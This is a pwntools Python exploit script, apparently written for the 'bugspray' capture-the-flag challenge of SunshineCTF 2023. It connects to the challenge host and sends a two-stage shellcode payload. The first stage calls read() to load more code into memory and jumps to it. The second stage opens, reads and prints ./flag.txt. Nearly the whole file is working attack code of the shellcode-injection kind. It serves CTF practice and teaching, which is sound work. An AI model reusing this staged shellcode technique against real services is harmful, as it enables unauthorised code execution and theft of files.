#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chal.2023.sunshinectf.games' '--port=23004' ./bugspray
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './bugspray')
context.terminal = ["kitty", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal.2023.sunshinectf.games'
port = int(args.PORT or 23004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
b loop
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# craft payload to write more stuff
assembly = [
        # call read(0, 0x7777f0, 0xff)
        "mov    rax, 0;",
        "mov    rdi, 0;", 
        "mov    rsi, 0x7777f0;",
        "mov    rdx, 0xff;",
        "syscall",
        "push   0x7777f0",
        "ret",
]

init_payload = asm('\n'.join(assembly))
init_payload += b'\x00' * (0x45 - len(init_payload)) # ensure exploit is 0x44B long

if(len(init_payload) > 0x45): print("[!!!] payload too long!!!")

# read file
assembly = [
        # call open("./flag.txt", 0, 0)
        "mov    rax, 2;",
        # this address needs to be updated
       f"mov    rdi, 0x7777f0;",
        "mov    rsi, 0;",
        "mov    rdx, 0;",
        "syscall;",
        # call read(rax, 0x777800, 0x40)
       f"mov    rdi, rax;",
        "mov    rax, 0;",
        "mov    rsi, 0x777900;",
        "mov    rdx, 0x40;",
        "syscall;",
        # call write(1, 0x777800, rax)
        "mov    rdx, rax;",
        "mov    rax, 1;",
       f"mov    rdi, 1;",
        "mov    rsi, 0x777900;",
        "syscall;",
        # call exit()
        "mov    rax, 60;",
        "mov    rdi, 0;",
        "syscall;",
    ]

main_payload = asm('\n'.join(assembly))
payload_offset = 0x10 - len(main_payload) % 0x10

assembly[1] = f"mov    rdi, 0x{0x7777f0+len(main_payload)+payload_offset:x};"

print("[*] created payload:")
print('\n'.join(assembly))

main_payload = b''.join([
    asm('\n'.join(assembly)),
    b'\x00' * payload_offset, # pad to set //bin/bash at the next 16B chunk
    b'./flag.txt',
])

# receive stuff and then
io.recvuntil(b'>>> \x00\x00')
io.send(init_payload)
input("waiting...")
io.send(main_payload)

io.interactive()
